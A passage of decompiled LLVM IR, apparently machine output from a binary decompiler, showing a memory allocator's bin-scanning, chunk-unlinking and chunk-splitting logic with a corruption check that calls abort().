  %v2_8052af0 = add i32 %v1_8052af0, ptrtoint (i32* @global_var_806188c.495 to i32)
  store i32 %v2_8052af0, i32* %eax.global-to-local, align 4
  %v1_8052af7 = add i32 %v1_8052af0, add (i32 ptrtoint (i32* @global_var_806188c.495 to i32), i32 8)
  %v2_8052af7 = inttoptr i32 %v1_8052af7 to i32*
  %v3_8052af7 = load i32, i32* %v2_8052af7, align 4
  store i32 %v3_8052af7, i32* %edx.global-to-local, align 4
  store i32 %v3_8052af7, i32* @ebx, align 4
  %v12_8052b00 = icmp eq i32 %v3_8052af7, %v2_8052af0
  br i1 %v12_8052b00, label %dec_label_pc_8052b30, label %dec_label_pc_8052b04

dec_label_pc_8052b04:                             ; preds = %dec_label_pc_8052ae7
  %v1_8052b04 = add i32 %v1_8052af0, add (i32 ptrtoint (i32* @global_var_806188c.495 to i32), i32 12)
  %v2_8052b04 = inttoptr i32 %v1_8052b04 to i32*
  %v3_8052b04 = load i32, i32* %v2_8052b04, align 4
  store i32 %v3_8052b04, i32* @ebx, align 4
  %v0_8052b07 = load i32, i32* @edi, align 4
  %v2_8052b07 = add i32 %v3_8052b04, 4
  %v3_8052b07 = inttoptr i32 %v2_8052b07 to i32*
  %v4_8052b07 = load i32, i32* %v3_8052b07, align 4
  %v10_8052b07 = icmp ult i32 %v0_8052b07, %v4_8052b07
  %v1_8052b0a = icmp eq i1 %v10_8052b07, false
  br i1 %v1_8052b0a, label %dec_label_pc_8052b12, label %dec_label_pc_8052b30

dec_label_pc_8052b12:                             ; preds = %dec_label_pc_8052b04
  %v1_8052b14 = or i32 %v0_8052b07, 1
  store i32 %v1_8052b14, i32* %eax.global-to-local, align 4
  store i32 %v3_8052af7, i32* %ebx.global-to-local, align 4
  %v2_8052b28101 = add i32 %v3_8052af7, 4
  %v3_8052b28102 = inttoptr i32 %v2_8052b28101 to i32*
  %v4_8052b28103 = load i32, i32* %v3_8052b28102, align 4
  %v10_8052b28104 = icmp ult i32 %v1_8052b14, %v4_8052b28103
  br i1 %v10_8052b28104, label %dec_label_pc_8052b19, label %dec_label_pc_8052b2d

dec_label_pc_8052b19:                             ; preds = %dec_label_pc_8052b12, %dec_label_pc_8052b19
  %v0_8052b2d105 = phi i32 [ %v3_8052b1d, %dec_label_pc_8052b19 ], [ %v3_8052af7, %dec_label_pc_8052b12 ]
  store i32 %v0_8052b2d105, i32* %ecx.global-to-local, align 4
  %v1_8052b1d = add i32 %v0_8052b2d105, 8
  %v2_8052b1d = inttoptr i32 %v1_8052b1d to i32*
  %v3_8052b1d = load i32, i32* %v2_8052b1d, align 4
  store i32 %v3_8052b1d, i32* %ecx.global-to-local, align 4
  store i32 %v3_8052b1d, i32* %ebx.global-to-local, align 4
  %v2_8052b28 = add i32 %v3_8052b1d, 4
  %v3_8052b28 = inttoptr i32 %v2_8052b28 to i32*
  %v4_8052b28 = load i32, i32* %v3_8052b28, align 4
  %v10_8052b28 = icmp ult i32 %v1_8052b14, %v4_8052b28
  br i1 %v10_8052b28, label %dec_label_pc_8052b19, label %dec_label_pc_8052b2d

dec_label_pc_8052b2d:                             ; preds = %dec_label_pc_8052b19, %dec_label_pc_8052b12
  %v0_8052b2d.lcssa = phi i32 [ %v3_8052af7, %dec_label_pc_8052b12 ], [ %v3_8052b1d, %dec_label_pc_8052b19 ]
  %v1_8052b2d = add i32 %v0_8052b2d.lcssa, 12
  %v2_8052b2d = inttoptr i32 %v1_8052b2d to i32*
  %v3_8052b2d = load i32, i32* %v2_8052b2d, align 4
  store i32 %v3_8052b2d, i32* @ebx, align 4
  br label %dec_label_pc_8052b30

dec_label_pc_8052b30:                             ; preds = %dec_label_pc_8052ad6, %dec_label_pc_8052b04, %dec_label_pc_8052ae7, %dec_label_pc_8052b2d
  %v0_8052b30 = phi i32 [ %v0_8052ae9, %dec_label_pc_8052ae7 ], [ %v0_8052ae9, %dec_label_pc_8052b2d ], [ %v0_8052ae9, %dec_label_pc_8052b04 ], [ %v2_8052ad8, %dec_label_pc_8052ad6 ]
  %stack_var_-64.1 = phi i32 [ %v2_8052af0, %dec_label_pc_8052ae7 ], [ %v0_8052b2d.lcssa, %dec_label_pc_8052b2d ], [ %v2_8052af0, %dec_label_pc_8052b04 ], [ %v3_8052ae2, %dec_label_pc_8052ad6 ]
  %v1_8052b32 = urem i32 %v0_8052b30, 32
  %v2_8052b32 = icmp eq i32 %v1_8052b32, 0
  store i32 %v1_8052b32, i32* %esi.global-to-local, align 4
  store i32 %v1_8052b32, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8052b3c = sdiv i32 %v0_8052b30, 32
  store i32 %v2_8052b3c, i32* %edx.global-to-local, align 4
  br i1 %v2_8052b32, label %bb84, label %bb

bb:                                               ; preds = %dec_label_pc_8052b30
  %v5_8052b3f = shl i32 1, %v1_8052b32
  store i32 %v5_8052b3f, i32* %eax.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_8052b30, %bb
  %v5_8052b41 = phi i32 [ 1, %dec_label_pc_8052b30 ], [ %v5_8052b3f, %bb ]
  %v1_8052b41 = mul nsw i32 %v2_8052b3c, 4
  %v2_8052b41 = add i32 %v1_8052b41, ptrtoint (i32* @global_var_8061b94.499 to i32)
  %v3_8052b41 = inttoptr i32 %v2_8052b41 to i32*
  %v4_8052b41 = load i32, i32* %v3_8052b41, align 4
  %v6_8052b41 = or i32 %v4_8052b41, %v5_8052b41
  store i32 %v6_8052b41, i32* %v3_8052b41, align 4
  %v0_8052b48 = load i32, i32* @ebx, align 4
  %v1_8052b48 = load i32, i32* @ebp, align 4
  %v2_8052b48 = add i32 %v1_8052b48, 12
  %v3_8052b48 = inttoptr i32 %v2_8052b48 to i32*
  store i32 %v0_8052b48, i32* %v3_8052b48, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_8052b4f = load i32, i32* @ebp, align 4
  %v2_8052b4f = add i32 %v1_8052b4f, 8
  %v3_8052b4f = inttoptr i32 %v2_8052b4f to i32*
  store i32 %stack_var_-64.1, i32* %v3_8052b4f, align 4
  %v0_8052b52 = load i32, i32* @ebp, align 4
  %v1_8052b52 = load i32, i32* @ebx, align 4
  %v2_8052b52 = add i32 %v1_8052b52, 8
  %v3_8052b52 = inttoptr i32 %v2_8052b52 to i32*
  store i32 %v0_8052b52, i32* %v3_8052b52, align 4
  %v0_8052b55 = load i32, i32* @ebp, align 4
  %v1_8052b55 = load i32, i32* @esi, align 4
  %v2_8052b55 = add i32 %v1_8052b55, 12
  %v3_8052b55 = inttoptr i32 %v2_8052b55 to i32*
  store i32 %v0_8052b55, i32* %v3_8052b55, align 4
  %v0_8052b58 = load i32, i32* @global_var_80618a0.498, align 32
  store i32 %v0_8052b58, i32* @ebp, align 4
  %v9_8052b5e = icmp eq i32 %v0_8052b58, 134617236
  %v1_8052b64 = icmp eq i1 %v9_8052b5e, false
  br i1 %v1_8052b64, label %dec_label_pc_8052a87, label %dec_label_pc_8052b6a

dec_label_pc_8052b6a:                             ; preds = %bb84, %dec_label_pc_8052b58.preheader
  br i1 %v8_8052a1b, label %dec_label_pc_8052bf8, label %dec_label_pc_8052b78

dec_label_pc_8052b78:                             ; preds = %dec_label_pc_8052b6a
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_8052b7c = mul i32 %stack_var_-40.0.ph, 8
  %v2_8052b7c = add i32 %v1_8052b7c, ptrtoint (i32* @global_var_806188c.495 to i32)
  store i32 %v2_8052b7c, i32* %edx.global-to-local, align 4
  %v1_8052b83 = add i32 %v1_8052b7c, add (i32 ptrtoint (i32* @global_var_806188c.495 to i32), i32 12)
  %v2_8052b83 = inttoptr i32 %v1_8052b83 to i32*
  %storemerge1.pre = load i32, i32* %v2_8052b83, align 4
  br label %dec_label_pc_8052bf4

dec_label_pc_8052b88:                             ; preds = %dec_label_pc_8052bf4
  %v1_8052b88 = add i32 %v4_8052b9f, 4
  %v2_8052b88 = inttoptr i32 %v1_8052b88 to i32*
  %v3_8052b88 = load i32, i32* %v2_8052b88, align 4
  store i32 %v3_8052b88, i32* %ebx.global-to-local, align 4
  %v1_8052b8b = add i32 %v4_8052b9f, 12
  %v2_8052b8b = inttoptr i32 %v1_8052b8b to i32*
  %v3_8052b8b = load i32, i32* %v2_8052b8b, align 4
  store i32 %v3_8052b8b, i32* @ecx, align 4
  %v1_8052b8e = and i32 %v3_8052b88, -4
  store i32 %v1_8052b8e, i32* @ebx, align 4
  %v10_8052b91 = icmp ult i32 %v1_8052b8e, %v1_8052d6a
  br i1 %v10_8052b91, label %dec_label_pc_8052bf4, label %dec_label_pc_8052b97

dec_label_pc_8052b97:                             ; preds = %dec_label_pc_8052b88
  %v1_8052b97 = add i32 %v4_8052b9f, 8
  %v2_8052b97 = inttoptr i32 %v1_8052b97 to i32*
  %v3_8052b97 = load i32, i32* %v2_8052b97, align 4
  store i32 %v3_8052b97, i32* @edx, align 4
  %v1_8052b9a = add i32 %v3_8052b97, 12
  %v2_8052b9a = inttoptr i32 %v1_8052b9a to i32*
  %v3_8052b9a = load i32, i32* %v2_8052b9a, align 4
  %v15_8052b9a = icmp eq i32 %v3_8052b9a, %v4_8052b9f
  %v1_8052b9d = icmp eq i1 %v15_8052b9a, false
  br i1 %v1_8052b9d, label %dec_label_pc_8052ba4, label %dec_label_pc_8052b9f

dec_label_pc_8052b9f:                             ; preds = %dec_label_pc_8052b97
  %v1_8052b9f = add i32 %v3_8052b8b, 8
  %v2_8052b9f = inttoptr i32 %v1_8052b9f to i32*
  %v3_8052b9f = load i32, i32* %v2_8052b9f, align 4
  %v15_8052b9f = icmp eq i32 %v3_8052b9f, %v4_8052b9f
  br i1 %v15_8052b9f, label %dec_label_pc_8052ba9, label %dec_label_pc_8052ba4

dec_label_pc_8052ba4:                             ; preds = %dec_label_pc_8052b9f, %dec_label_pc_8052b97
  %v0_8052ba4 = call i32 @abort()
  store i32 %v0_8052ba4, i32* %eax.global-to-local, align 4
  %v0_8052ba9.pre = load i32, i32* @ebx, align 4
  %v0_8052baf.pre = load i32, i32* @ecx, align 4
  %v1_8052baf.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052ba9

dec_label_pc_8052ba9:                             ; preds = %dec_label_pc_8052b9f, %dec_label_pc_8052ba4
  %v1_8052baf = phi i32 [ %v3_8052b97, %dec_label_pc_8052b9f ], [ %v1_8052baf.pre, %dec_label_pc_8052ba4 ]
  %v0_8052baf = phi i32 [ %v3_8052b8b, %dec_label_pc_8052b9f ], [ %v0_8052baf.pre, %dec_label_pc_8052ba4 ]
  %v0_8052ba9 = phi i32 [ %v1_8052b8e, %dec_label_pc_8052b9f ], [ %v0_8052ba9.pre, %dec_label_pc_8052ba4 ]
  %v5_8052bab = sub i32 %v0_8052ba9, %v1_8052d6a
  store i32 %v5_8052bab, i32* %esi.global-to-local, align 4
  %v2_8052baf = add i32 %v1_8052baf, 12
  %v3_8052baf = inttoptr i32 %v2_8052baf to i32*
  store i32 %v0_8052baf, i32* %v3_8052baf, align 4
  %v0_8052bb2 = load i32, i32* @edx, align 4
  %v1_8052bb2 = load i32, i32* @ecx, align 4
  %v2_8052bb2 = add i32 %v1_8052bb2, 8
  %v3_8052bb2 = inttoptr i32 %v2_8052bb2 to i32*
  store i32 %v0_8052bb2, i32* %v3_8052bb2, align 4
  %v0_8052bb5 = load i32, i32* %esi.global-to-local, align 4
  %v0_8052bb8 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052bb8 = add i32 %v0_8052bb8, 8
  store i32 %v1_8052bb8, i32* @ecx, align 4
  %tmp127 = icmp ult i32 %v0_8052bb5, 16
  br i1 %tmp127, label %dec_label_pc_80530b9, label %dec_label_pc_8052bc1

dec_label_pc_8052bc1:                             ; preds = %dec_label_pc_8052ba9
  %v2_8052bc5 = add i32 %v0_8052bb8, %v1_8052d6a
  store i32 %v2_8052bc5, i32* @edx, align 4
  %v1_8052bc8 = or i32 %v1_8052d6a, 1
  store i32 %v1_8052bc8, i32* %ebx.global-to-local, align 4
  %v2_8052bcb = add i32 %v0_8052bb8, 4
  %v3_8052bcb = inttoptr i32 %v2_8052bcb to i32*
  store i32 %v1_8052bc8, i32* %v3_8052bcb, align 4
  %v0_8052bce = load i32, i32* %esi.global-to-local, align 4
  %v1_8052bd0 = or i32 %v0_8052bce, 1
  store i32 %v1_8052bd0, i32* %eax.global-to-local, align 4
  %v0_8052bd3 = load i32, i32* @edx, align 4
  %v1_8052bd3 = load i32, i32* @ebp, align 4
  %v2_8052bd3 = add i32 %v1_8052bd3, 8
  %v3_8052bd3 = inttoptr i32 %v2_8052bd3 to i32*
  store i32 %v0_8052bd3, i32* %v3_8052bd3, align 4
  %v0_8052bd6 = load i32, i32* @edx, align 4
  %v1_8052bd6 = load i32, i32* @ebp, align 4
  %v2_8052bd6 = add i32 %v1_8052bd6, 12
  %v3_8052bd6 = inttoptr i32 %v2_8052bd6 to i32*
  store i32 %v0_8052bd6, i32* %v3_8052bd6, align 4
  %v0_8052bd9 = load i32, i32* @edx, align 4
  %v1_8052bd9 = add i32 %v0_8052bd9, 8
  %v2_8052bd9 = inttoptr i32 %v1_8052bd9 to i32*
  store i32 ptrtoint (i32* @global_var_8061894.497 to i32), i32* %v2_8052bd9, align 4
  %v0_8052be0 = load i32, i32* @edx, align 4
  %v1_8052be0 = add i32 %v0_8052be0, 12
  %v2_8052be0 = inttoptr i32 %v1_8052be0 to i32*
  store i32 ptrtoint (i32* @global_var_8061894.497 to i32), i32* %v2_8052be0, align 4
  %v0_8052be7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052be7 = load i32, i32* @edx, align 4
  %v2_8052be7 = add i32 %v1_8052be7, 4
  %v3_8052be7 = inttoptr i32 %v2_8052be7 to i32*
  store i32 %v0_8052be7, i32* %v3_8052be7, align 4
  %v0_8052bea = load i32, i32* %esi.global-to-local, align 4
  %v1_8052bea = load i32, i32* @edx, align 4
  %v3_8052bea = add i32 %v1_8052bea, %v0_8052bea
  %v4_8052bea = inttoptr i32 %v3_8052bea to i32*
  store i32 %v0_8052bea, i32* %v4_8052bea, align 4
  br label %dec_label_pc_80530be

dec_label_pc_8052bf4:                             ; preds = %dec_label_pc_8052b88, %dec_label_pc_8052b78
  %v4_8052b9f = phi i32 [ %storemerge1.pre, %dec_label_pc_8052b78 ], [ %v3_8052b8b, %dec_label_pc_8052b88 ]
  store i32 %v4_8052b9f, i32* %eax.global-to-local, align 4
  %v12_8052bf4 = icmp eq i32 %v4_8052b9f, %v2_8052b7c
  %v1_8052bf6 = icmp eq i1 %v12_8052bf4, false
  br i1 %v1_8052bf6, label %dec_label_pc_8052b88, label %dec_label_pc_8052bf8.loopexit

dec_label_pc_8052bf8.loopexit:                    ; preds = %dec_label_pc_8052bf4
  br label %dec_label_pc_8052bf8

dec_label_pc_8052bf8:                             ; preds = %dec_label_pc_8052bf8.loopexit, %dec_label_pc_8052b6a
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8052c01 = add i32 %stack_var_-40.0.ph, 1
  %v2_8052c04 = udiv i32 %v1_8052c01, 32
  store i32 %v2_8052c04, i32* @edi, align 4
  %v1_8052c07 = mul i32 %v1_8052c01, 8
  %v2_8052c07 = add i32 %v1_8052c07, ptrtoint (i32* @global_var_806188c.495 to i32)
  store i32 %v2_8052c07, i32* %ebx.global-to-local, align 4
  %v1_8052c0e = urem i32 %v1_8052c01, 32
  %v2_8052c0e = icmp eq i32 %v1_8052c0e, 0
  store i32 %v1_8052c0e, i32* %ecx.global-to-local, align 4
  %v1_8052c11 = mul nuw nsw i32 %v2_8052c04, 4
  %v2_8052c11 = add i32 %v1_8052c11, ptrtoint (i32* @global_var_8061b94.499 to i32)
  %v3_8052c11 = inttoptr i32 %v2_8052c11 to i32*
  %v4_8052c11 = load i32, i32* %v3_8052c11, align 4
  store i32 %v4_8052c11, i32* %edx.global-to-local, align 4
  br i1 %v2_8052c0e, label %.preheader, label %bb85

bb85:                                             ; preds = %dec_label_pc_8052bf8
  %v5_8052c18 = shl i32 1, %v1_8052c0e
  store i32 %v5_8052c18, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_8052bf8, %bb85, %dec_label_pc_8052c59
  %v1_8052c1a = phi i32 [ %v1_8052c1a.pre, %dec_label_pc_8052c59 ], [ %v4_8052c11, %bb85 ], [ %v4_8052c11, %dec_label_pc_8052bf8 ]
  %v0_8052c1e = phi i32 [ %v0_8052c1a.pre, %dec_label_pc_8052c59 ], [ %v5_8052c18, %bb85 ], [ 1, %dec_label_pc_8052bf8 ]
  %tmp86 = icmp ule i32 %v0_8052c1e, %v1_8052c1a
  %v1_8052c1e = icmp eq i32 %v0_8052c1e, 0
  %v1_8052c20 = icmp eq i1 %v1_8052c1e, false
  %or.cond = and i1 %tmp86, %v1_8052c20
  br i1 %or.cond, label %dec_label_pc_8052c1e.dec_label_pc_8052c4e.preheader_crit_edge, label %dec_label_pc_8052c22.preheader

dec_label_pc_8052c1e.dec_label_pc_8052c4e.preheader_crit_edge: ; preds = %.preheader
  %v0_8052c4912.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052c4e.preheader

dec_label_pc_8052c22.preheader:                   ; preds = %.preheader
  %v0_8052c22.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8052c22

dec_label_pc_8052c22:                             ; preds = %dec_label_pc_8052c22.preheader, %dec_label_pc_8052c2c
  %v0_8052c22 = phi i32 [ %v0_8052c22.pre, %dec_label_pc_8052c22.preheader ], [ %v1_8052c22, %dec_label_pc_8052c2c ]
  %v1_8052c22 = add i32 %v0_8052c22, 1
  store i32 %v1_8052c22, i32* @edi, align 4
  %v6_8052c26 = icmp ugt i32 %v1_8052c22, 2
  br i1 %v6_8052c26, label %dec_label_pc_8052cd5.loopexit, label %dec_label_pc_8052c2c

dec_label_pc_8052c2c:                             ; preds = %dec_label_pc_8052c22
  %v1_8052c2c = mul i32 %v1_8052c22, 4
  %v2_8052c2c = add i32 %v1_8052c2c, ptrtoint (i32* @global_var_8061b94.499 to i32)
  %v3_8052c2c = inttoptr i32 %v2_8052c2c to i32*
  %v4_8052c2c = load i32, i32* %v3_8052c2c, align 4
  store i32 %v4_8052c2c, i32* %edx.global-to-local, align 4
  %v1_8052c33 = icmp eq i32 %v4_8052c2c, 0
  br i1 %v1_8052c33, label %dec_label_pc_8052c22, label %dec_label_pc_8052c37

dec_label_pc_8052c37:                             ; preds = %dec_label_pc_8052c2c
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_8052c3e = mul i32 %v1_8052c22, 256
  store i32 %v2_8052c3e, i32* %eax.global-to-local, align 4
  %v1_8052c41 = add i32 %v2_8052c3e, ptrtoint (i32* @global_var_806188c.495 to i32)
  store i32 %v1_8052c41, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052c4e.preheader

dec_label_pc_8052c4e.preheader:                   ; preds = %dec_label_pc_8052c1e.dec_label_pc_8052c4e.preheader_crit_edge, %dec_label_pc_8052c37
  %v0_8052c4912 = phi i32 [ %v1_8052c41, %dec_label_pc_8052c37 ], [ %v0_8052c4912.pre, %dec_label_pc_8052c1e.dec_label_pc_8052c4e.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_8052c37 ], [ %v0_8052c1e, %dec_label_pc_8052c1e.dec_label_pc_8052c4e.preheader_crit_edge ]
  %v0_8052c60 = phi i32 [ %v4_8052c2c, %dec_label_pc_8052c37 ], [ %v1_8052c1a, %dec_label_pc_8052c1e.dec_label_pc_8052c4e.preheader_crit_edge ]
  %v2_8052c4e4 = and i32 %v0_8052c60, %esi.promoted
  %v3_8052c4e5 = icmp eq i32 %v2_8052c4e4, 0
  br i1 %v3_8052c4e5, label %dec_label_pc_8052c49, label %dec_label_pc_8052c52

dec_label_pc_8052c49:                             ; preds = %dec_label_pc_8052c4e.preheader, %dec_label_pc_8052c49
  %v2_8052c4c14 = phi i32 [ %v2_8052c4c, %dec_label_pc_8052c49 ], [ %esi.promoted, %dec_label_pc_8052c4e.preheader ]
  %v0_8052c4913 = phi i32 [ %v1_8052c49, %dec_label_pc_8052c49 ], [ %v0_8052c4912, %dec_label_pc_8052c4e.preheader ]
  %v1_8052c49 = add i32 %v0_8052c4913, 8
  %v2_8052c4c = mul i32 %v2_8052c4c14, 2
  %v2_8052c4e = and i32 %v2_8052c4c, %v0_8052c60
  %v3_8052c4e = icmp eq i32 %v2_8052c4e, 0
  br i1 %v3_8052c4e, label %dec_label_pc_8052c49, label %dec_label_pc_8052c4e.dec_label_pc_8052c52_crit_edge

dec_label_pc_8052c4e.dec_label_pc_8052c52_crit_edge: ; preds = %dec_label_pc_8052c49
  store i32 %v1_8052c49, i32* %ebx.global-to-local, align 4
  store i32 %v2_8052c4c, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052c52

dec_label_pc_8052c52:                             ; preds = %dec_label_pc_8052c4e.dec_label_pc_8052c52_crit_edge, %dec_label_pc_8052c4e.preheader
  %v0_8052c62 = phi i32 [ %v2_8052c4c, %dec_label_pc_8052c4e.dec_label_pc_8052c52_crit_edge ], [ %esi.promoted, %dec_label_pc_8052c4e.preheader ]
  %v1_8052c7c = phi i32 [ %v1_8052c49, %dec_label_pc_8052c4e.dec_label_pc_8052c52_crit_edge ], [ %v0_8052c4912, %dec_label_pc_8052c4e.preheader ]
  %v1_8052c52 = add i32 %v1_8052c7c, 12
  %v2_8052c52 = inttoptr i32 %v1_8052c52 to i32*
  %v3_8052c52 = load i32, i32* %v2_8052c52, align 4
  store i32 %v3_8052c52, i32* @ecx, align 4
  %v12_8052c55 = icmp eq i32 %v3_8052c52, %v1_8052c7c
  %v1_8052c57 = icmp eq i1 %v12_8052c55, false
  br i1 %v1_8052c57, label %dec_label_pc_8052c6d, label %dec_label_pc_8052c59

dec_label_pc_8052c59:                             ; preds = %dec_label_pc_8052c52
  %v1_8052c5b = add i32 %v3_8052c52, 8
  store i32 %v1_8052c5b, i32* %ebx.global-to-local, align 4
  %v1_8052c5e = sub i32 -1, %v0_8052c62
  store i32 %v1_8052c5e, i32* %eax.global-to-local, align 4
  %v2_8052c60 = and i32 %v0_8052c60, %v1_8052c5e
  store i32 %v2_8052c60, i32* %edx.global-to-local, align 4
  %v2_8052c62 = mul i32 %v0_8052c62, 2
  store i32 %v2_8052c62, i32* %esi.global-to-local, align 4
  %v1_8052c64 = load i32, i32* @edi, align 4
  %v2_8052c64 = mul i32 %v1_8052c64, 4
  %v3_8052c64 = add i32 %v2_8052c64, ptrtoint (i32* @global_var_8061b94.499 to i32)
  %v4_8052c64 = inttoptr i32 %v3_8052c64 to i32*
  store i32 %v2_8052c60, i32* %v4_8052c64, align 4
  %v0_8052c1a.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8052c1a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8052c6d:                             ; preds = %dec_label_pc_8052c52
  %v1_8052c6d = add i32 %v3_8052c52, 4
  %v2_8052c6d = inttoptr i32 %v1_8052c6d to i32*
  %v3_8052c6d = load i32, i32* %v2_8052c6d, align 4
  store i32 %v3_8052c6d, i32* %edx.global-to-local, align 4
  %v1_8052c70 = add i32 %v3_8052c52, 12
  %v2_8052c70 = inttoptr i32 %v1_8052c70 to i32*
  %v3_8052c70 = load i32, i32* %v2_8052c70, align 4
  store i32 %v3_8052c70, i32* %eax.global-to-local, align 4
  %v1_8052c73 = and i32 %v3_8052c6d, -4
  store i32 %v1_8052c73, i32* @edx, align 4
  %v5_8052c78 = sub i32 %v1_8052c73, %v1_8052d6a
  store i32 %v5_8052c78, i32* %esi.global-to-local, align 4
  store i32 %v3_8052c70, i32* %v2_8052c52, align 4
  %v0_8052c7f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052c7f = load i32, i32* %eax.global-to-local, align 4
  %v2_8052c7f = add i32 %v1_8052c7f, 8
  %v3_8052c7f = inttoptr i32 %v2_8052c7f to i32*
  store i32 %v0_8052c7f, i32* %v3_8052c7f, align 4
  %v0_8052c82 = load i32, i32* %esi.global-to-local, align 4
  %tmp128 = icmp ult i32 %v0_8052c82, 16
  br i1 %tmp128, label %dec_label_pc_8052c87, label %dec_label_pc_8052c8e

dec_label_pc_8052c87:                             ; preds = %dec_label_pc_8052c6d
  %v0_8052c87 = load i32, i32* @ecx, align 4
  %v1_8052c87 = load i32, i32* @edx, align 4
  %v2_8052c87 = add i32 %v0_8052c87, 4
  %v3_8052c87 = add i32 %v2_8052c87, %v1_8052c87
  %v4_8052c87 = inttoptr i32 %v3_8052c87 to i32*
  %v5_8052c87 = load i32, i32* %v4_8052c87, align 4
  %v6_8052c87 = or i32 %v5_8052c87, 1
  store i32 %v6_8052c87, i32* %v4_8052c87, align 4
  br label %dec_label_pc_8052ccd

dec_label_pc_8052c8e:                             ; preds = %dec_label_pc_8052c6d
  store i32 %v1_8052d6a, i32* %eax.global-to-local, align 4
  %v0_8052c97 = load i32, i32* @ecx, align 4
  %v2_8052c97 = add i32 %v0_8052c97, %v1_8052d6a
  store i32 %v2_8052c97, i32* @edx, align 4
  %v1_8052c9a = load i32, i32* @ebp, align 4
  %v2_8052c9a = add i32 %v1_8052c9a, 8
  %v3_8052c9a = inttoptr i32 %v2_8052c9a to i32*
  store i32 %v2_8052c97, i32* %v3_8052c9a, align 4
  %v0_8052c9d = load i32, i32* @edx, align 4
  %v1_8052c9d = load i32, i32* @ebp, align 4
  %v2_8052c9d = add i32 %v1_8052c9d, 12
  %v3_8052c9d = inttoptr i32 %v2_8052c9d to i32*
  store i32 %v0_8052c9d, i32* %v3_8052c9d, align 4
  %v0_8052ca0 = load i32, i32* @edx, align 4
  %v1_8052ca0 = add i32 %v0_8052ca0, 8
  %v2_8052ca0 = inttoptr i32 %v1_8052ca0 to i32*
  store i32 ptrtoint (i32* @global_var_8061894.497 to i32), i32* %v2_8052ca0, align 4
  %v0_8052ca7 = load i32, i32* @edx, align 4
  %v1_8052ca7 = add i32 %v0_8052ca7, 12
  %v2_8052ca7 = inttoptr i32 %v1_8052ca7 to i32*
  store i32 ptrtoint (i32* @global_var_8061894.497 to i32), i32* %v2_8052ca7, align 4
  br i1 %v6_8052a23, label %dec_label_pc_8052cb6, label %dec_label_pc_8052cb0

dec_label_pc_8052cb0:                             ; preds = %dec_label_pc_8052c8e
  %v0_8052cb0 = load i32, i32* @edx, align 4
  store i32 %v0_8052cb0, i32* @global_var_8061890.496, align 16
  br label %dec_label_pc_8052cb6

dec_label_pc_8052cb6:                             ; preds = %dec_label_pc_8052c8e, %dec_label_pc_8052cb0
  %v4_8052cb6 = or i32 %v1_8052d6a, 1
  %v0_8052cbb = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8052cb6, i32* %ebx.global-to-local, align 4
  %v1_8052cc1 = or i32 %v0_8052cbb, 1
  store i32 %v1_8052cc1, i32* %eax.global-to-local, align 4
  %v1_8052cc4 = load i32, i32* @ecx, align 4
  %v2_8052cc4 = add i32 %v1_8052cc4, 4
  %v3_8052cc4 = inttoptr i32 %v2_8052cc4 to i32*
  store i32 %v4_8052cb6, i32* %v3_8052cc4, align 4
  %v0_8052cc7 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052cc7 = load i32, i32* @edx, align 4
  %v3_8052cc7 = add i32 %v1_8052cc7, %v0_8052cc7
  %v4_8052cc7 = inttoptr i32 %v3_8052cc7 to i32*
  store i32 %v0_8052cc7, i32* %v4_8052cc7, align 4
  %v0_8052cca = load i32, i32* %eax.global-to-local, align 4
  %v1_8052cca = load i32, i32* @edx, align 4
  %v2_8052cca = add i32 %v1_8052cca, 4
  %v3_8052cca = inttoptr i32 %v2_8052cca to i32*
  store i32 %v0_8052cca, i32* %v3_8052cca, align 4
  br label %dec_label_pc_8052ccd

dec_label_pc_8052ccd:                             ; preds = %dec_label_pc_8052c87, %dec_label_pc_8052cb6
  %v0_8052ccd = load i32, i32* @ecx, align 4
  %v1_8052ccd = add i32 %v0_8052ccd, 8
  store i32 %v1_8052ccd, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80530cf

dec_label_pc_8052cd5.loopexit:                    ; preds = %dec_label_pc_8052c22
  br label %dec_label_pc_8052cd5

dec_label_pc_8052cd5:                             ; preds = %dec_label_pc_8052cd5.loopexit, %dec_label_pc_80529dd, %dec_label_pc_80529e5
  %v0_8052cd5 = load i32, i32* @global_var_806188c.495, align 4
  store i32 %v0_8052cd5, i32* @ebx, align 4
  %v1_8052cdf = add i32 %v1_8052d6a, 16
  store i32 %v1_8052cdf, i32* @esi, align 4
  %v1_8052ce2 = add i32 %v0_8052cd5, 4
  %v2_8052ce2 = inttoptr i32 %v1_8052ce2 to i32*
  %v3_8052ce2 = load i32, i32* %v2_8052ce2, align 4
  %v1_8052ce9 = and i32 %v3_8052ce2, -4
  store i32 %v1_8052ce9, i32* %ecx.global-to-local, align 4
  %v7_8052cec = icmp ult i32 %v1_8052ce9, %v1_8052cdf
  br i1 %v7_8052cec, label %dec_label_pc_8052d0c, label %dec_label_pc_8052cf0

dec_label_pc_8052cf0:                             ; preds = %dec_label_pc_8052cd5
  %v2_8052cf4 = add i32 %v0_8052cd5, %v1_8052d6a
  store i32 %v2_8052cf4, i32* @edx, align 4
  %v1_8052cf7 = or i32 %v1_8052d6a, 1
  store i32 %v1_8052cf7, i32* %eax.global-to-local, align 4
  store i32 %v2_8052cf4, i32* @global_var_806188c.495, align 4
  store i32 %v1_8052cf7, i32* %v2_8052ce2, align 4
  %v0_8052d03 = load i32, i32* %ecx.global-to-local, align 4
  %v5_8052d03 = sub i32 %v0_8052d03, %v1_8052d6a
